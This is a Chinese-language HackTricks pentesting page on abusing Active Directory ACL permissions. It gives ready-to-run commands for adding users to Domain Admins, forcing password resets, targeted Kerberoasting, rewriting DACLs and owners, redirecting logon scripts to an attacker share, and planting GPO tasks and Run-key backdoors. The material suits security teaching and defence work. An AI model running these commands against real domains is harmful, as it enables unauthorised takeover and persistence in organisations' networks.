# 滥用 Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**本页面主要总结了来自** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **和** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**。更多细节请查看原文。**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **用户的 GenericAll 权限**

该权限赋予攻击者对目标用户帐户的完全控制。一旦使用 `Get-ObjectAcl` 命令确认拥有 `GenericAll` 权限，攻击者可以：

- **修改目标密码**：使用 `net user <username> <password> /domain`，攻击者可以重置该用户的密码。
- **Targeted Kerberoasting**：将 SPN 分配给该用户账号，使其 kerberoastable，然后使用 Rubeus 和 targetedKerberoast.py 提取并尝试破解 ticket-granting ticket (TGT) 的哈希。
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: 禁用该用户的预认证，使其账户易受 ASREPRoasting 攻击。
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **组上的 GenericAll 权限**

如果攻击者对像 `Domain Admins` 这样的组拥有 `GenericAll` 权限，该权限允许他们操作该组的成员资格。在使用 `Get-NetGroup` 确认该组的 distinguished name（DN）后，攻击者可以：

- **将自己添加到 Domain Admins 组**：这可以通过直接命令或使用像 Active Directory 或 PowerSploit 这样的模块来完成。
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- 从 Linux 上你也可以利用 BloodyAD 在你对某些组拥有 GenericAll/Write 成员资格时将自己添加到任意组中。如果目标组被嵌套到 “Remote Management Users”，你将立即在认可该组的主机上获得 WinRM 访问权限：
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

在计算机对象或用户帐户上拥有这些特权可用于：

- **Kerberos Resource-based Constrained Delegation**: 使得能够接管计算机对象。
- **Shadow Credentials**: 使用该技术可以通过利用这些特权创建 shadow credentials 来模拟计算机或用户帐户。

## **WriteProperty on Group**

如果用户对某个组（例如 `Domain Admins`）的所有对象具有 `WriteProperty` 权限，他们可以：

- **将自己添加到 Domain Admins 组**：通过组合 `net user` 和 `Add-NetGroupUser` 命令可以实现，该方法允许在域内进行 privilege escalation。
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

该权限使攻击者能够通过直接操作组成员资格的命令将自己添加到特定组，例如 `Domain Admins`。使用以下命令序列可以实现自我添加：
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

类似的权限，如果攻击者对那些组拥有 `WriteProperty` 权利，就可以通过修改组属性直接将自己添加到这些组中。对此权限的确认和执行可以通过以下方式完成：
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

持有对用户的 `ExtendedRight`（`User-Force-Change-Password`）允许在不知道当前密码的情况下重置密码。可以通过 PowerShell 或其他命令行工具验证并利用此权限，提供多种重置用户密码的方法，包括交互式会话和用于非交互环境的一行命令。可用命令从简单的 PowerShell 调用到在 `Linux` 上使用 `rpcclient` 不等，展示了 attack vectors 的多样性。
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner 在组上**

如果攻击者发现他们对某个组拥有 `WriteOwner` 权限，他们可以将该组的所有权更改为自己。 当相关组是 `Domain Admins` 时，这尤其具有影响力，因为更改所有者允许对组属性和成员资格进行更广泛的控制。 该过程包括通过 `Get-ObjectAcl` 找到正确的对象，然后使用 `Set-DomainObjectOwner` 修改所有者（可以通过 SID 或名称）。
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

此权限允许攻击者修改用户属性。具体来说，拥有 `GenericWrite` 访问权限的攻击者可以更改用户的登录脚本路径，以便在用户登录时执行恶意脚本。该操作通过使用 `Set-ADObject` 命令更新目标用户的 `scriptpath` 属性，使其指向攻击者的脚本来实现。
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite（针对组）**

拥有此权限的攻击者可以操纵组的成员资格，例如将自己或其他用户添加到特定组。此过程涉及创建一个 credential object，使用它将用户添加到或从组中移除，并使用 PowerShell 命令验证成员身份的更改。
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

拥有 AD 对象并对其具有 `WriteDACL` 权限，可使攻击者为自己授予对该对象的 `GenericAll` 权限。这是通过 ADSI 操纵实现的，允许对该对象进行完全控制并修改其组成员资格。尽管如此，使用 Active Directory 模块的 `Set-Acl` / `Get-Acl` cmdlets 尝试利用这些权限时存在限制。
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **域内复制 (DCSync)**

DCSync 攻击利用域上的特定复制权限，模拟域控制器并同步数据，包括用户凭据。该强大技术需要诸如 `DS-Replication-Get-Changes` 的权限，允许攻击者在不直接访问域控制器的情况下从 AD 环境中提取敏感信息。 [**Learn more about the DCSync attack here.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO 委派

被委派管理组策略对象 (GPOs) 的访问权限可能带来重大安全风险。例如，如果像 `offense\spotless` 这样的用户被委派 GPO 管理权限，他们可能拥有 **WriteProperty**、**WriteDacl** 和 **WriteOwner** 等特权。这些权限可以被滥用用于恶意目的，可使用 PowerView 识别： `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### 枚举 GPO 权限

要识别配置错误的 GPO，可以串联 PowerSploit 的 cmdlet。这可以发现特定用户有权限管理的 GPO： `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**给定策略应用到的计算机**：可以解析特定 GPO 应用于哪些计算机，有助于了解潜在影响范围。 `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**应用于特定计算机的策略**：要查看特定计算机应用了哪些策略，可使用诸如 `Get-DomainGPO` 的命令。

**应用了给定策略的 OU**：可以使用 `Get-DomainOU` 来识别受特定策略影响的组织单元 (OUs)。

你也可以使用工具 [**GPOHound**](https://github.com/cogiceo/GPOHound) 来枚举 GPO 并发现其中的问题。

### 滥用 GPO - New-GPOImmediateTask

配置错误的 GPO 可被利用来执行代码，例如通过创建即时计划任务。这可以用于在受影响的机器上将用户添加到本地管理员组，从而显著提升权限：
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

如果已安装 GroupPolicy module，它允许创建并链接新的 GPOs，并设置首选项（例如 registry values），以在受影响的计算机上执行 backdoors。此方法要求 GPO 被更新且用户登录到计算机后才会执行：
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse 提供了一种滥用现有 GPOs 的方法，通过添加任务或修改设置，无需创建新的 GPOs。该工具需要在应用更改之前修改现有的 GPOs，或使用 RSAT 工具创建新的 GPOs：
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### 强制策略更新

GPO 更新通常大约每 90 分钟发生一次。为加快此过程，特别是在实施更改之后，可在目标计算机上使用 `gpupdate /force` 命令以强制立即更新策略。该命令可确保对 GPO 的任何修改在不必等待下一个自动更新周期的情况下生效。

### 内部机制

检查某个 GPO（例如 `Misconfigured Policy`）的计划任务时，可以确认已添加像 `evilTask` 这样的任务。这些任务通常通过脚本或命令行工具创建，目的是修改系统行为或提升权限。

任务的结构在由 `New-GPOImmediateTask` 生成的 XML 配置文件中有所体现，概述了计划任务的具体细节——包括要执行的命令及其触发器。该文件表示了在 GPO 中如何定义和管理计划任务，提供了一种在策略执行过程中运行任意命令或脚本的方法。

### 用户与组

GPO 还允许操纵目标系统上的用户和组成员资格。通过直接编辑用户与组（Users and Groups）策略文件，攻击者可以将用户添加到特权组，例如本地的 `administrators` 组。通过委派 GPO 管理权限，攻击者得以修改策略文件以包含新用户或更改组成员资格。

Users and Groups 的 XML 配置文件说明了这些更改如何实现。通过向该文件添加条目，可以为特定用户授予在受影响系统上的提升权限。此方法通过操纵 GPO 提供了一种直接的权限提升途径。

此外，还可以考虑其他执行代码或保持持久性的方式，例如利用登录/注销脚本、修改用于自动运行的注册表键、通过 .msi 文件安装软件或编辑服务配置等。这些技术为通过滥用 GPO 来维持访问和控制目标系统提供了多种途径。

## 参考

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
